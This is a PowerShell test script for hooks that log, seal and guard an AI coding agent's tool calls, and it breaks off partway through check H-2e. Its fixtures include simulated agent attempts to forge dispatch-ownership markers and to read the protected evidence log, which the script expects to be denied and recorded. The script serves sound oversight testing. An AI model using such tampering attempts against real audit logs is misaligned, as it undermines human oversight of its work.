#Requires -Version 5.1
<#
.SYNOPSIS
  LAM-ACCEPT WP-1 instrument -- evidence hooks, next generation (H-1, H-2, H-3, H-4).

.DESCRIPTION
  Contract: docs/framework/LAM-ACCEPT.md, WP-1, as later amended -- the first host's
  acceptance record, not a framework document: not in the tree since an earlier release, read at v0.2.0 from history.
  THE EXIT CODE IS THE CONTRACT: 0 = no member failed, non-zero = the failure count. A member whose clause
  could not be measured here SKIPS: never a pass, and the summary line then names the skips.

  INSTRUMENT-INTEGRITY LAW (design SS4.5 law 5), obeyed per member:
    - anchors its own tree via $PSScriptRoot, NEVER cwd;
    - prints no green summary line on a failing run;
    - derives its summary counts from the check recorder, never from a hand-authored total;
    - asserts its own fixtures are well-formed before trusting any PASS taken over them (F-0).

  ZERO REPO RESIDUE BY CONSTRUCTION. CLAUDE_PROJECT_DIR is pointed at a sandbox under
  .mission-runtime/ (gitignored), so every path the next-gen hooks resolve -- the runtime plane
  AND the committed plane .mission/evidence/ -- lands inside the sandbox, never in the repository.

  WHAT IS UNDER TEST is tools/evidence-hooks-next/. The A1 generation is read-only for this build;
  it is reached only through H-4, which runs the A1 negative suite against the NEXT-GEN hooks.
#>
[CmdletBinding()]
param(
    [switch]$KeepSandbox
)

$ErrorActionPreference = 'Stop'

# tests/lam/<this file>  ->  up two  ->  repo root. Anchored to the script, never to cwd.
$repoRoot  = (Resolve-Path (Join-Path $PSScriptRoot '..\..')).Path
$nextRoot  = Join-Path $repoRoot 'tools\evidence-hooks-next'
$hooksDir  = Join-Path $nextRoot 'hooks'
$libPath   = Join-Path $hooksDir 'lib\evidence-common.ps1'
$suitePath = Join-Path $nextRoot 'tests\test-a1-negative.ps1'
$patchPath = Join-Path $nextRoot 'patches\clean-tree-exemption.patch'

$sandbox   = Join-Path $repoRoot '.mission-runtime\lam-wp1-sandbox'
$ownedId   = 'session-wp1-owned'
$plainId   = 'session-wp1-unowned'
$gapId     = 'session-wp1-gaps'

$failures  = 0
$checksRun = 0
$skips     = 0
function Check {
    # -Skipped is the THIRD outcome WP-2, WP-3, WP-4 and WP-6 carry, given to WP-1 in an earlier release for H-12, whose page
    # a project the framework installs does not hold: a member whose clause could not be MEASURED in this checkout. Never
    # reported as a pass -- the face reads [SKIP], the detail leads with SKIPPED: and the reason, and the summary
    # withholds the word "all" -- and not counted as a failure: the exit code is the FAILURE count.
    param([string]$Id, [string]$Title, [bool]$Ok, [string]$Detail, [switch]$Skipped)
    $script:checksRun++
    $tag = if ($Skipped) { 'SKIP' } elseif ($Ok) { 'PASS' } else { 'FAIL' }
    Write-Host ""
    Write-Host "[$tag] $Id -- $Title"
    if ($Detail) { Write-Host $Detail }
    if ($Skipped) { $script:skips++ }
    elseif (-not $Ok) { $script:failures++ }
}

Write-Host "=============================================================================="
Write-Host " LAM WP-1 INSTRUMENT -- evidence-hooks-next"
Write-Host "=============================================================================="
Write-Host "repo root : $repoRoot"
Write-Host "under test: $nextRoot"
Write-Host "sandbox   : $sandbox   (under .mission-runtime/, gitignored)"

# =============================================================================================
# F-0 -- FIXTURE PRECONDITION (law 5, the false-PASS class)
# =============================================================================================
# If the artifacts under test are absent, every behavioural member below would either fail for
# the wrong reason or pass vacuously. Establish presence FIRST, as its own member, so a RED run
# on an unbuilt tree is legible rather than a wall of derived failures.
$required = [ordered]@{
    'hooks/lib/evidence-common.ps1'       = $libPath
    'hooks/evidence-guard-pretooluse.ps1' = (Join-Path $hooksDir 'evidence-guard-pretooluse.ps1')
    'hooks/evidence-post-tool-use.ps1'    = (Join-Path $hooksDir 'evidence-post-tool-use.ps1')
    'hooks/evidence-pre-compact.ps1'      = (Join-Path $hooksDir 'evidence-pre-compact.ps1')
    'hooks/evidence-stop-finalize.ps1'    = (Join-Path $hooksDir 'evidence-stop-finalize.ps1')
    'hooks/evidence-dispatch-end.ps1'     = (Join-Path $hooksDir 'evidence-dispatch-end.ps1')
    'tests/test-a1-negative.ps1'          = $suitePath
    'patches/clean-tree-exemption.patch'  = $patchPath
    # The patch's own recorded PRE-IMAGE, which H-3 builds its
    # subject tree from, hash-pinned on the patch face. H-3 reads both paths from THIS table.
    'patches/clean-tree-exemption-pre-image/mission-lib.ps1.preimage' =
        (Join-Path $nextRoot 'patches\clean-tree-exemption-pre-image\mission-lib.ps1.preimage')
    'patches/clean-tree-exemption-pre-image/mission-spec-accept.ps1.preimage' =
        (Join-Path $nextRoot 'patches\clean-tree-exemption-pre-image\mission-spec-accept.ps1.preimage')
}
$missing = @()
$detail = "  expected under tools/evidence-hooks-next/:`n"
foreach ($k in $required.Keys) {
    $present = Test-Path -LiteralPath $required[$k]
    if (-not $present) { $missing += $k }
    $mark = if ($present) { 'present' } else { 'ABSENT ' }
    $detail += "    [$mark] $k`n"
}
Check -Id 'F-0' -Title 'every next-gen artifact the later members drive is present' `
      -Ok ($missing.Count -eq 0) -Detail $detail

if ($missing.Count -gt 0) {
    Write-Host ""
    Write-Host "------------------------------------------------------------------------------"
    Write-Host " FIXTURE ABSENT -- $($missing.Count) artifact(s) missing; behavioural members NOT run."
    Write-Host " checks run: $checksRun   failures: $failures"
    Write-Host "------------------------------------------------------------------------------"
    Write-Host "EXIT: $failures"
    exit $failures
}

# --- sandbox ---------------------------------------------------------------------------------
if (Test-Path -LiteralPath $sandbox) { Remove-Item -LiteralPath $sandbox -Recurse -Force }
New-Item -ItemType Directory -Path $sandbox -Force | Out-Null
$env:CLAUDE_PROJECT_DIR = $sandbox
Remove-Item Env:\MISSION_DISPATCH_ID -ErrorAction SilentlyContinue

. $libPath

function Invoke-Hook {
    param([string]$Script, [string]$Json)
    $p = Join-Path $hooksDir $Script
    $out = $Json | & powershell -NoProfile -ExecutionPolicy Bypass -File $p
    return [pscustomobject]@{ stdout = ($out -join "`n"); exit = $LASTEXITCODE }
}

function New-PostPayload {
    param([string]$SessionId, [string]$Command, [int]$ExitCode = 0,
          [string]$Stdout = 'ok', [string]$Stderr = '')
    return (@{
        session_id      = $SessionId
        hook_event_name = 'PostToolUse'
        tool_name       = 'Bash'
        tool_input      = @{ command = $Command }
        tool_response   = @{ stdout = $Stdout; stderr = $Stderr; exit_code = $ExitCode }
    } | ConvertTo-Json -Depth 8 -Compress)
}

function Get-LogEntries {
    param([string]$DispatchId)
    $p = Join-Path (Get-EvidenceRuntimeDir -Root $sandbox -DispatchId $DispatchId) 'log.jsonl'
    if (-not (Test-Path -LiteralPath $p)) { return @() }
    $out = New-Object System.Collections.Generic.List[object]
    foreach ($line in [System.IO.File]::ReadAllLines($p)) {
        if (-not $line.Trim()) { continue }
        try { $out.Add(($line | ConvertFrom-Json)) } catch { }
    }
    return $out.ToArray()
}

function New-OwnerFile {
    param([string]$Dir, [string]$DispatchId)
    [System.IO.File]::WriteAllText((Join-Path $Dir 'OWNER'),
        "runner_id: lam-wp1-instrument`ndispatch_id: $DispatchId`nspawned_at: $(Get-UtcStampZ)`n",
        (New-Object System.Text.UTF8Encoding($false)))
}

# =============================================================================================
# H-1 -- D10 BOUNDARY OWNERSHIP
# =============================================================================================
$ownedDir = Get-EvidenceRuntimeDir -Root $sandbox -DispatchId $ownedId
New-Item -ItemType Directory -Path $ownedDir -Force | Out-Null
New-OwnerFile -Dir $ownedDir -DispatchId $ownedId
# The dispatch id is PINNED for every phase rather than left to be derived from session_id.
# Get-EvidenceDispatchId returns "session-$SessionId" when nothing pins it, so a session id that
# already begins with "session-" resolves to "session-session-..." and the hooks write to a
# different directory than the one this instrument prepared. Pinning removes the ambiguity;
# ownership is still decided by the OWNER file on disk, never by this variable.
$env:MISSION_DISPATCH_ID = $ownedId
$ownerPath = Join-Path $ownedDir 'OWNER'
$endPath   = Join-Path $ownedDir 'DISPATCH-END'
$manPath   = Join-Path $ownedDir 'manifest.json'
$ownedLog  = Join-Path $ownedDir 'log.jsonl'

# --- H-1a: three turns of an OWNED session, each ending in Stop -> OPEN, nothing finalized ----
$stopOwned = @{ session_id = $ownedId; hook_event_name = 'Stop' } | ConvertTo-Json -Compress
for ($turn = 1; $turn -le 3; $turn++) {
    $null = Invoke-Hook -Script 'evidence-post-tool-use.ps1' `
              -Json (New-PostPayload -SessionId $ownedId -Command "git rev-parse HEAD  -- turn $turn")
    $null = Invoke-Hook -Script 'evidence-stop-finalize.ps1' -Json $stopOwned
}
$stOpen = Get-EvidenceState -Root $sandbox -DispatchId $ownedId
$noMan  = -not (Test-Path -LiteralPath $manPath)
# @() is load-bearing, not style: the A1 library dot-sourced above sets Set-StrictMode -Version
# Latest, under which a helper returning an EMPTY array unrolls to $null and `.Count` throws.
$logN   = @(Get-LogEntries -DispatchId $ownedId).Count
$detail = @"
  OWNER present   : $(Test-Path -LiteralPath $ownerPath)   (runner-written, before spawn)
  turns driven    : 3 (PostToolUse + Stop each)
  log entries     : $logN   (expect 3)
  state           : $($stOpen.state)   (expect OPEN)
  consumable      : $($stOpen.consumable)   (expect False)
  manifest absent : $noMan   (expect True -- Stop must NOT finalize an owned dispatch)
  reason          : $($stOpen.reason)
"@
Check -Id 'H-1a' -Title 'owned session: three Stops finalize nothing; state derives OPEN' `
      -Ok ($stOpen.state -eq 'OPEN' -and -not $stOpen.consumable -and $noMan -and $logN -eq 3) `
      -Detail $detail

# --- H-1b: the runner writes DISPATCH-END; the marker finalizes -------------------------------
[System.IO.File]::WriteAllText($endPath,
    "dispatch_id: $ownedId`nended_at: $(Get-UtcStampZ)`nworker_exit: 0`n",
    (New-Object System.Text.UTF8Encoding($false)))
$rEnd    = Invoke-Hook -Script 'evidence-dispatch-end.ps1' `
             -Json (@{ session_id = $ownedId } | ConvertTo-Json -Compress)
$stFinal = Get-EvidenceState -Root $sandbox -DispatchId $ownedId
$manObj  = $null
if (Test-Path -LiteralPath $manPath) { $manObj = [System.IO.File]::ReadAllText($manPath) | ConvertFrom-Json }
$schemaOk = ($null -ne $manObj) -and ([string](Get-EntryField $manObj 'schema_version' '') -eq '1.3.0')
$noGaps   = ($null -ne $manObj) -and ($manObj.PSObject.Properties.Name -notcontains 'capture_gaps')
$detail = @"
  dispatch-end hook exit   : $($rEnd.exit)   (expect 0)
  state                    : $($stFinal.state)   (expect FINALIZED)
  consumable               : $($stFinal.consumable)   (expect True)
  entry_count              : $(if ($manObj) { $manObj.entry_count } else { 'NO MANIFEST' })   (expect 3)
  schema_version           : $(if ($manObj) { $manObj.schema_version } else { 'NO MANIFEST' })   (expect 1.3.0 -- 1.4.0 is forbidden)
  capture_gaps in manifest : $(-not $noGaps)   (expect False -- the sidecar carries it)
"@
Check -Id 'H-1b' -Title 'owned session: the runner-written DISPATCH-END marker finalizes; manifest stays 1.3.0' `
      -Ok ($stFinal.state -eq 'FINALIZED' -and $stFinal.consumable -and $schemaOk -and $noGaps -and
           $null -ne $manObj -and $manObj.entry_count -eq 3) -Detail $detail

# --- H-1c: a hash mismatch AFTER finalize is TAMPERED, never OPEN -----------------------------
$orig    = [System.IO.File]::ReadAllBytes($ownedLog)
$mutated = [System.Text.Encoding]::UTF8.GetString($orig).Replace('turn 1', 'turn X')
[System.IO.File]::WriteAllText($ownedLog, $mutated, (New-Object System.Text.UTF8Encoding($false)))
$stTamper = Get-EvidenceState -Root $sandbox -DispatchId $ownedId
[System.IO.File]::WriteAllBytes($ownedLog, $orig)          # restore -- later members reuse this store
$stRestored = Get-EvidenceState -Root $sandbox -DispatchId $ownedId
$detail = @"
  after mutating a sealed byte in place:
    state  : $($stTamper.state)   (expect TAMPERED -- ownership must never launder a mutation into OPEN)
    reason : $($stTamper.reason)
  after restoring the original bytes:
    state  : $($stRestored.state)   (expect FINALIZED -- the fixture is sound for the members below)
"@
Check -Id 'H-1c' -Title 'owned session: post-finalize hash mismatch derives TAMPERED, never OPEN' `
      -Ok ($stTamper.state -eq 'TAMPERED' -and $stRestored.state -eq 'FINALIZED') -Detail $detail

# --- H-1d: both ownership markers are worker-unwritable, and the denial is RECORDED -----------
# Operator constraint: "Both paths are worker-unwritable: add them to the next-gen
# guard's protected set and prove it in the H-1 instrument (a worker-role Write to either path is
# denied and logged)."
$env:MISSION_DISPATCH_ID = $ownedId
$denyResults = @()
foreach ($t in @(@{ n = 'OWNER';        p = ".mission-runtime/evidence/$ownedId/OWNER" },
                 @{ n = 'DISPATCH-END'; p = ".mission-runtime/evidence/$ownedId/DISPATCH-END" })) {
    $payload = @{
        session_id      = $ownedId
        hook_event_name = 'PreToolUse'
        tool_name       = 'Write'
        tool_input      = @{ file_path = $t.p; content = 'a worker forging the dispatch boundary' }
    } | ConvertTo-Json -Depth 8 -Compress
    $r = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json $payload
    $denyResults += [pscustomobject]@{ name = $t.n; exit = $r.exit; stdout = $r.stdout }
}
$bothDenied = @($denyResults | Where-Object { $_.exit -eq 2 -and $_.stdout -like '*"permissionDecision":"deny"*' }).Count -eq 2
$deniedRecs = @(Get-LogEntries -DispatchId $ownedId |
                Where-Object { [string](Get-EntryField $_ 'tool' '') -eq '_denied' })
$markerRecs = @($deniedRecs | Where-Object {
                  $c = [string](Get-EntryField $_ 'command' '')
                  ($c -like '*OWNER*') -or ($c -like '*DISPATCH-END*') })
$outcomesOk = ($markerRecs.Count -gt 0) -and
              (@($markerRecs | Where-Object { [string](Get-EntryField $_ 'outcome' '') -eq 'denied' }).Count -eq $markerRecs.Count)
$detail = @"
  worker-role Write attempts:
$(($denyResults | ForEach-Object { "    $($_.name.PadRight(13)) exit=$($_.exit)" }) -join "`n")
  both denied (exit 2 AND a deny decision on stdout) : $bothDenied   (expect True)
  '_denied' records naming a marker                  : $($markerRecs.Count)   (expect 2)
  every such record carries outcome: denied          : $outcomesOk   (expect True)
"@
Check -Id 'H-1d' -Title 'owned session: worker Write to OWNER and DISPATCH-END is denied AND logged' `
      -Ok ($bothDenied -and $markerRecs.Count -eq 2 -and $outcomesOk) -Detail $detail

# --- H-1f: an UNOWNED dispatch keeps A1 semantics ---------------------------------------------
$env:MISSION_DISPATCH_ID = $plainId          # pinned; this dispatch has NO OWNER file
$null = Invoke-Hook -Script 'evidence-post-tool-use.ps1' `
          -Json (New-PostPayload -SessionId $plainId -Command 'git status --porcelain')
$null = Invoke-Hook -Script 'evidence-stop-finalize.ps1' `
          -Json (@{ session_id = $plainId; hook_event_name = 'Stop' } | ConvertTo-Json -Compress)
$stPlain  = Get-EvidenceState -Root $sandbox -DispatchId $plainId
$plainDir = Get-EvidenceRuntimeDir -Root $sandbox -DispatchId $plainId
$plainMan = $null
if (Test-Path -LiteralPath (Join-Path $plainDir 'manifest.json')) {
    $plainMan = [System.IO.File]::ReadAllText((Join-Path $plainDir 'manifest.json')) | ConvertFrom-Json
}
$ownerAbsent = -not (Test-Path -LiteralPath (Join-Path $plainDir 'OWNER'))
$detail = @"
  OWNER absent       : $ownerAbsent   (expect True)
  state after 1 Stop : $($stPlain.state)   (expect FINALIZED -- A1 semantics, N4 unchanged)
  consumable         : $($stPlain.consumable)   (expect True)
  finalize_count     : $(if ($plainMan) { $plainMan.finalize_count } else { 'NO MANIFEST' })   (expect 1)
  schema_version     : $(if ($plainMan) { $plainMan.schema_version } else { 'NO MANIFEST' })   (expect 1.3.0)
"@
Check -Id 'H-1f' -Title 'unowned session: OWNER absent, so the first Stop finalizes (A1 semantics)' `
      -Ok ($ownerAbsent -and $stPlain.state -eq 'FINALIZED' -and $stPlain.consumable -and
           $null -ne $plainMan -and $plainMan.finalize_count -eq 1 -and
           [string]$plainMan.schema_version -eq '1.3.0') -Detail $detail

# =============================================================================================
# H-2 -- D8: call-counter seq, outcome on every entry, capture-gaps sidecar
# =============================================================================================
$gapDir = Get-EvidenceRuntimeDir -Root $sandbox -DispatchId $gapId
New-Item -ItemType Directory -Path $gapDir -Force | Out-Null
New-OwnerFile -Dir $gapDir -DispatchId $gapId
$env:MISSION_DISPATCH_ID = $gapId

# =============================================================================================
# THE SYNTHESIZED FAILURE CHECK IS REMOVED.
# =============================================================================================
# This used to call PostToolUse BY HAND with `-ExitCode 3` and assert an `outcome: failed` entry
# came back. It passed, and it was measuring nothing: **PostToolUse never fires on a failed call**,
# so the only way that entry ever existed was because the instrument itself sent a payload the
# harness never sends. A member that manufactures its own evidence is worse than an absent one --
# it reports a capability the system does not have, in the exact place a reader looks to find out.
#
# The failure half now belongs to H-2e below, where it is judged by RECONCILIATION -- the only
# mechanism that can witness it. What survives here is the DENIAL half, which is genuinely cured
# and genuinely fires.
#
# TWO genuinely SUCCEEDING calls, not one. Removing the fabricated failure left the fixture with
# too few tool calls for H-2b, which needs at least three to show a counter staying contiguous
# across a _precompact line. The honest repair is another REAL call, not a weaker assertion.
$null = Invoke-Hook -Script 'evidence-post-tool-use.ps1' `
          -Json (New-PostPayload -SessionId $gapId -Command 'git rev-parse HEAD')
$null = Invoke-Hook -Script 'evidence-post-tool-use.ps1' `
          -Json (New-PostPayload -SessionId $gapId -Command 'git status --porcelain')
$rDeny = Invoke-Hook -Script 'evidence-guard-pretooluse.ps1' -Json (@{
            session_id      = $gapId
            hook_event_name = 'PreToolUse'
            tool_name       = 'Bash'
            tool_input      = @{ command = 'type .mission-runtime\evidence\x\log.jsonl' }
         } | ConvertTo-Json -Depth 8 -Compress)

$gapEntries = @(Get-LogEntries -DispatchId $gapId)
$byOutcome  = @{}
foreach ($e in $gapEntries) {
    $o = [string](Get-EntryField $e 'outcome' '(none)')
    if (-not $byOutcome.ContainsKey($o)) { $byOutcome[$o] = 0 }
    $byOutcome[$o]++
}
$hasDenied = $byOutcome.ContainsKey('denied') -and ($byOutcome['denied'] -ge 1)
# NO `outcome: failed` IS ASSERTED, AND ITS ABSENCE IS ASSERTED INSTEAD. On this harness a failed
# call reaches no hook, so an entry carrying that outcome could only have come from a fabricated
# payload. If one ever appears here, something is manufacturing evidence and this member says so.
$noFabricatedFailed = -not ($byOutcome.ContainsKey('failed'))
$verbatimOk = @($gapEntries |
                 Where-Object { [string](Get-EntryField $_ 'outcome' '') -eq 'denied' } |
                 Where-Object { [string](Get-EntryField $_ 'reason' '') -like '*DENIED by evidence-guard*' }).Count -ge 1
$detail = @"
  THE DENIAL HALF, which is genuinely cured and genuinely fires:
  guard hook exit on the deny     : $($rDeny.exit)   (expect 2)
  log entries                     : $($gapEntries.Count)   (expect 3 -- two succeeded, one denied)
  outcomes seen                   : $(($byOutcome.GetEnumerator() | Sort-Object Key | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join ', ')
  an outcome: denied entry exists  : $hasDenied   (expect True)
  deny text recorded verbatim      : $verbatimOk   (expect True)
  NO outcome: failed entry exists  : $noFabricatedFailed   (expect True -- PostToolUse never fires on
                                    a failed call, so such an entry could only be fabricated. The
                                    failure half is H-2e's, judged by reconciliation.)
"@
Check -Id 'H-2a' -Title 'a denied call leaves an entry with its outcome and the verbatim deny text, and no fabricated failed entry exists' `
      -Ok ($hasDenied -and $verbatimOk -and $noFabricatedFailed) -Detail $detail

# --- H-2b: seq is a CALL COUNTER, independent of log length -----------------------------------
# The discriminator: a _precompact line consumes a LOG LINE but is not a TOOL CALL. Under A1, seq
# derived from log length, so a _precompact shifted every later seq. A call counter does not.
$null = Invoke-Hook -Script 'evidence-pre-compact.ps1' -Json (@{
            session_id = $gapId; hook_event_name = 'PreCompact'; transcript_path = ''
         } | ConvertTo-Json -Compress)
$null = Invoke-Hook -Script 'evidence-post-tool-use.ps1' `
          -Json (New-PostPayload -SessionId $gapId -Command 'git log --oneline -1')

$after    = @(Get-LogEntries -DispatchId $gapId)
$callSeqs = @($after |
                Where-Object {
                    $t = [string](Get-EntryField $_ 'tool' '')
                    ($t -ne '_precompact') -and ($t -ne '_denied')
                } |
                ForEach-Object { [int](Get-EntryField $_ 'seq' -1) })
$sorted     = @($callSeqs | Sort-Object)
$expected   = @(1..([Math]::Max($sorted.Count, 1)))
$contiguous = ($sorted.Count -gt 0) -and (@(Compare-Object $sorted $expected -SyncWindow 0).Count -eq 0)
$counterPath = Join-Path $gapDir 'seq.counter'
$counterOk   = Test-Path -LiteralPath $counterPath
$detail = @"
  total log lines               : $($after.Count)   (tool + denied + precompact -- deliberately NOT the call count)
  tool-call seq values          : $($sorted -join ', ')
  contiguous from 1, no gap     : $contiguous   (expect True)
  persisted counter file exists : $counterOk   (expect True -- seq survives independent of log length)
  counter contents              : $(if ($counterOk) { ([System.IO.File]::ReadAllText($counterPath)).Trim() } else { 'ABSENT' })
"@
Check -Id 'H-2b' -Title 'seq is a persisted call counter: contiguous across a _precompact line, no gap' `
      -Ok ($contiguous -and $counterOk -and $sorted.Count -ge 3) -Detail $detail

# --- H-2c: the sidecar exists and is EMPTY when nothing was dropped ---------------------------
[System.IO.File]::WriteAllText((Join-Path $gapDir 'DISPATCH-END'),
    "dispatch_id: $gapId`nended_at: $(Get-UtcStampZ)`nworker_exit: 0`n",
    (New-Object System.Text.UTF8Encoding($false)))
# THE SECOND ARM THE DELIVERED LIFECYCLE ACTUALLY HAS (V-1 round 6, WP-1). This member used to
# assert an EMPTY sidecar while supplying no second arm at all -- which is exactly the false-clean
# the refutation named: with only the call counter running, "nothing was dropped" is not something
# the artifact is entitled to say. A runner-owned dispatch gets no transcript (a `claude -p` child
# leaves none, measured), so its second arm is the worker's own stream, which the runner tees and
# which the hook now discovers beside the log.
#
# Written to MATCH the store exactly -- 3 succeeded, 1 denied -- so a clean report is earned rather
# than assumed. H-2d and H-2e then perturb this same fixture in each direction.
$streamPath = Join-Path $gapDir 'runner-stream.jsonl'
$h2cLines = @()
for ($i = 1; $i -le 3; $i++) {
    $h2cLines += (@{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_use'; id = "su_$i"; name = 'Bash'; input = @{ command = 'x' } }) } } | ConvertTo-Json -Depth 8 -Compress)
    $h2cLines += (@{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_result'; tool_use_id = "su_$i"; content = 'ok' }) } } | ConvertTo-Json -Depth 8 -Compress)
}
$h2cLines += (@{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_use'; id = 'sd_1'; name = 'Bash'; input = @{ command = 'x' } }) } } | ConvertTo-Json -Depth 8 -Compress)
$h2cLines += (@{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_result'; tool_use_id = 'sd_1'; is_error = $true; content = 'DENIED by evidence-guard (AM-417): fixture' }) } } | ConvertTo-Json -Depth 8 -Compress)
[System.IO.File]::WriteAllLines($streamPath, $h2cLines, (New-Object System.Text.UTF8Encoding($false)))

$null = Invoke-Hook -Script 'evidence-dispatch-end.ps1' `
          -Json (@{ session_id = $gapId } | ConvertTo-Json -Compress)
$sidecar     = Join-Path $gapDir 'capture-gaps.yaml'
$sidePresent = Test-Path -LiteralPath $sidecar
$sideText    = if ($sidePresent) { [System.IO.File]::ReadAllText($sidecar) } else { '' }
$emptyList   = $sidePresent -and ($sideText -match '(?m)^capture_gaps:\s*\[\]\s*$')
$manGap = $null
if (Test-Path -LiteralPath (Join-Path $gapDir 'manifest.json')) {
    $manGap = [System.IO.File]::ReadAllText((Join-Path $gapDir 'manifest.json')) | ConvertFrom-Json
}
$stillClean = ($null -ne $manGap) -and
              ($manGap.PSObject.Properties.Name -notcontains 'capture_gaps') -and
              ([string](Get-EntryField $manGap 'schema_version' '') -eq '1.3.0')
$detail = @"
  sidecar path : $sidecar
  present      : $sidePresent   (expect True)
  empty list   : $emptyList   (expect True -- nothing was dropped)
  manifest is 1.3.0 and carries NO capture_gaps : $stillClean   (expect True)
  sidecar body:
$(($sideText.TrimEnd() -split "`n" | ForEach-Object { "    $_" }) -join "`n")
"@
Check -Id 'H-2c' -Title 'capture-gaps sidecar is written beside the manifest, empty when no call was dropped' `
      -Ok ($sidePresent -and $emptyList -and $stillClean) -Detail $detail

# --- H-2d: delete one log line -> the sidecar becomes non-empty -------------------------------
$gapLog  = Join-Path $gapDir 'log.jsonl'
$lines   = @([System.IO.File]::ReadAllLines($gapLog) | Where-Object { $_.Trim() })
$dropped = @($lines | Select-Object -First ($lines.Count - 1))
[System.IO.File]::WriteAllLines($gapLog, $dropped, (New-Object System.Text.UTF8Encoding($false)))
$null = Invoke-Hook -Script 'evidence-dispatch-end.ps1' `
          -Json (@{ session_id = $gapId; force_reconcile = $true } | ConvertTo-Json -Compress)
$sideText2 = if (Test-Path -LiteralPath $sidecar) { [System.IO.File]::ReadAllText($sidecar) } else { '' }
$nonEmpty  = ($sideText2 -notmatch '(?m)^capture_gaps:\s*\[\]\s*$') -and ($sideText2 -match 'seq:')
$detail = @"
  log lines before / after deletion : $($lines.Count) / $($dropped.Count)
  sidecar non-empty after reconcile : $nonEmpty   (expect True)
  sidecar body:
$(($sideText2.TrimEnd() -split "`n" | ForEach-Object { "    $_" }) -join "`n")
"@
Check -Id 'H-2d' -Title 'deleting a log line makes the capture-gaps sidecar non-empty' `
      -Ok $nonEmpty -Detail $detail

# =============================================================================================
# H-2e -- A FAILED CALL IS CAUGHT BY RECONCILIATION
# =============================================================================================
# THE PROPERTY: a vanished call can never coexist with an empty sidecar.
#
# A failed call reaches NO hook -- no log entry, no seq slot, no hook error. Under the previous
# design both arms of the reconciliation were blind to exactly that: the counter arm increments
# INSIDE PostToolUse, and the transcript arm compared `succeeded`. One measurement taken twice is
# not a reconciliation, and the sidecar certified a clean capture over a lost call.
#
# The transcript arm now counts ALL tool calls regardless of outcome. The transcript is written by
# the HARNESS, outside the capture path, which is the property that makes it a real second opinion.
#
# THE FIXTURE IS A TRANSCRIPT, NOT A FABRICATED LOG ENTRY, and the difference is the whole point of
# this member's existence: the old check manufactured the evidence it then found. Here the store is
# left exactly as the hooks wrote it -- one succeeded call and one denied call -- and the transcript
# records a THIRD call that no hook ever saw, which is precisely the shape a real failure leaves.
$trPath = Join-Path $sandbox 'h2e-transcript.jsonl'
# A CALL IS A PAIR: the tool_use record, and the tool_result that says how it ended. The three
# outcomes are the three the summariser classifies -- succeeded (no is_error), failed (is_error
# without the guard's preamble), denied (is_error carrying it). Modelling them is not decoration:
# the reconciliation is now PER CATEGORY, and a fixture that made every call look successful would
# be exercising one branch and reporting on three.
function New-TrPair {
    param([string]$Id, [ValidateSet('succeeded','failed','denied','unresolved')][string]$Outcome)
    $use = @{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_use'; id = $Id; name = 'Bash'; input = @{ command = 'x' } }) } }
    # UNRESOLVED IS THE ABSENCE OF THE SECOND RECORD, not a third kind of it. A session that stops
    # while a call is in flight leaves exactly this: a tool_use the transcript never resolves, and
    # no log entry either, because PostToolUse cannot fire for a call that never returned.
    if ($Outcome -eq 'unresolved') { return @(($use | ConvertTo-Json -Depth 8 -Compress)) }
    $body = switch ($Outcome) {
        'denied' { 'DENIED by evidence-guard (AM-417): fixture' }
        'failed' { 'exit 1: something went wrong' }
        default  { 'ok' }
    }
    $res = @{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_result'; tool_use_id = $Id; content = $body }) } }
    if ($Outcome -ne 'succeeded') { $res.message.content[0]['is_error'] = $true }
    return @(($use | ConvertTo-Json -Depth 8 -Compress), ($res | ConvertTo-Json -Depth 8 -Compress))
}
function Write-Tr {
    param([string]$Path, [int]$Succeeded, [int]$Denied, [int]$Failed, [int]$Unresolved = 0)
    $lines = @()
    $n = 0
    for ($i = 0; $i -lt $Succeeded;  $i++) { $n++; $lines += (New-TrPair -Id "tu_$n" -Outcome 'succeeded') }
    for ($i = 0; $i -lt $Denied;     $i++) { $n++; $lines += (New-TrPair -Id "tu_$n" -Outcome 'denied') }
    for ($i = 0; $i -lt $Failed;     $i++) { $n++; $lines += (New-TrPair -Id "tu_$n" -Outcome 'failed') }
    for ($i = 0; $i -lt $Unresolved; $i++) { $n++; $lines += (New-TrPair -Id "tu_$n" -Outcome 'unresolved') }
    [System.IO.File]::WriteAllLines($Path, $lines, (New-Object System.Text.UTF8Encoding($false)))
}
# Restore the log line H-2d deleted, so this member judges a store that is otherwise INTACT --
# otherwise a non-empty sidecar here could be H-2d's deletion rather than the vanished call.
[System.IO.File]::WriteAllLines($gapLog, $lines, (New-Object System.Text.UTF8Encoding($false)))

# THE ACCOUNTED COUNT IS DERIVED FROM THE STORE, NOT ASSUMED. The first version of this fixture
# hardcoded three transcript calls against a store it believed held two -- and an edit elsewhere in
# this member changed the store, so the shortfall silently became zero and the member reported a
# clean sidecar while claiming to test a dirty one. A fixture that hardcodes the size of something
# it does not own is measuring its author's memory.
$h2eEntries = @(Get-LogEntries -DispatchId $gapId)
$h2eLogged  = @($h2eEntries | Where-Object {
    $t = [string](Get-EntryField $_ 'tool' ''); ($t -ne '_precompact') -and ($t -ne '_denied') }).Count
$h2eDenied  = @($h2eEntries | Where-Object { [string](Get-EntryField $_ 'tool' '') -eq '_denied' }).Count
$h2eAccounted = $h2eLogged + $h2eDenied

function Get-Sidecar {
    param([string]$Path, [switch]$NoSession)
    # $null = , because the writer RETURNS the sidecar object and an uncaptured return joins this
    # function's output stream -- the caller then gets an array whose first element is a PSCustomObject
    # rather than the text it asked for.
    if ($NoSession) { $null = Write-EvidenceCaptureGapsSidecar -Root $sandbox -DispatchId $gapId -TranscriptPath $Path }
    else            { $null = Write-EvidenceCaptureGapsSidecar -Root $sandbox -DispatchId $gapId -TranscriptPath $Path -SessionId $gapId }
    if (Test-Path -LiteralPath $sidecar) { return [System.IO.File]::ReadAllText($sidecar) }
    return ''
}

# THE CASE THE MEMBER IS NAMED FOR: the store is intact and correct, and the transcript records one
# FAILED call besides -- the shape a real failure leaves, because PostToolUse never fires for it.
Write-Tr -Path $trPath -Succeeded $h2eLogged -Denied $h2eDenied -Failed 1
$sideText3 = Get-Sidecar -Path $trPath
$h2eNonEmpty = ($sideText3 -notmatch '(?m)^capture_gaps:\s*\[\]\s*$')
